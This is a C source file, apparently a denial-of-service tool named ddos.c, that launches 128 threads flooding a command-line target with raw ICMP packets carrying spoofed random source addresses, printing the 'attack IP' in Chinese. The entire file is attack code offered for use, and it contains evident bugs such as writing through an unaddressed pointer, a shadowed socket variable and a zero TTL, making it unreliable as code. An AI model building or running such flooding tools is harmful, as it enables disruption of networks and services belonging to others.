/*************************************************************************
	> File Name: ddos.c
	> Author:
	> Mail:
	> Created Time: Fri 18 Aug 2017 01:54:54 PM CST
 ************************************************************************/

#include <stdio.h>
#include <sys/types.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>
#include <netinet/ip.h>
#include <linux/if_packet.h>
#include <fcntl.h>
#include <sys/time.h>
#include <netdb.h>
#include <errno.h>
#include <netinet/ip_icmp.h>
#include <netinet/in.h>
#define MAX 128
//static in_addr_t dest;
static unsigned long dest;
static int sockfd;
void dos_sig();
void dos_fun();
void dos_icmp();
unsigned long myrandom(int, int);
static int alive = -1;
int main(int argc, char **argv)
{
	struct hostent *host = NULL;
	struct protoent *protocol = NULL;
	char protoname[] = "icmp";
	int i;
	pthread_t pthread[MAX];
	int err = -1;
	int sockfd;
	if (argc < 2)
	{
		printf("Usage:<hostname>\n");
		return -1;
	}
	protocol = getprotobyname(protoname);
	if (protocol == NULL)
	{
		perror("getprotobyname()");
		return -1;
	}
	dest = inet_addr(argv[1]);
	if (dest == INADDR_NONE)
	{
		host = gethostbyname(argv[1]);
		if (host == NULL)
		{
			perror("gethostbyname()");
			return -1;
		}
		memcpy((char*)dest, host->h_addr, host->h_length);
	}
	sockfd = socket(AF_INET, SOCK_RAW, 0);
	if (sockfd < 0)
		sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
	setsockopt(sockfd, SOL_IP, IP_HDRINCL, "1", sizeof("1"));
	for (i = 0; i < MAX; i++)
	{
		err = pthread_create(&pthread[i], NULL, (void *)&dos_fun, NULL);
	}
	for (i = 0; i < MAX; i++)
	{
		pthread_join(pthread[i], NULL);
	}
	close(sockfd);
	return 0;
}
void dos_fun()
{
	while (alive)
	{
		dos_icmp();
	}
}
void dos_sig()
{
	alive = 0;
	printf("结束线程\n");
	exit(-1);

}
void dos_icmp()
{
	static unsigned int mod = 0;
	struct sockaddr_in addr;
	struct ip *pip;
	struct icmp *picmp;
	char *packet;
	struct in_addr *paddr1, *paddr2;
	unsigned long mydest;
	int paklen = sizeof(struct ip) + sizeof(struct icmp) + 64;
	packet = malloc(paklen);
	pip = (struct ip*)packet;
	picmp = (struct icmp*)(packet + sizeof(struct ip));
	memset(packet, 0, paklen);
	pip->ip_v = 4;
	pip->ip_hl = 5;
	pip->ip_tos = 0;
	pip->ip_len = htons(paklen);
	pip->ip_id = htons(getpid());
	pip->ip_off = 0;
	pip->ip_ttl = 0x0;
	pip->ip_p = IPPROTO_ICMP;
	pip->ip_sum = 0;
	mydest = myrandom(0, 65535);

	paddr1 = (struct in_addr*)&mydest;
	pip->ip_src = *paddr1;

	paddr2 = (struct in_addr*)&dest;
	pip->ip_dst = *paddr2;

	picmp->icmp_type = IPPORT_ECHO;
	picmp->icmp_code = 0;
	picmp->icmp_cksum = htons(~(IPPORT_ECHO << 8));

	addr.sin_family = AF_INET;
	addr.sin_addr = pip->ip_dst;
	addr.sin_port = htons(0);

	sendto(sockfd, packet, paklen, 0, (struct sockaddr*)&addr, sizeof(struct sockaddr));
	if ((mod % 1000000) == 0)
	{

		printf("攻击IP：%s\n", inet_ntoa(addr.sin_addr));
		printf("源IP：%s\n", inet_ntoa(pip->ip_src));
		//mod++;
	}
	{
		//printf("%d\n", mod);
		mod++;
	}
	free(packet);
}
unsigned long myrandom(int begin, int end)
{
	int betw = end - begin + 1;
	int ret = 0;
	srand((unsigned)time(0));
	ret = random() % betw + begin;
	return ret;

}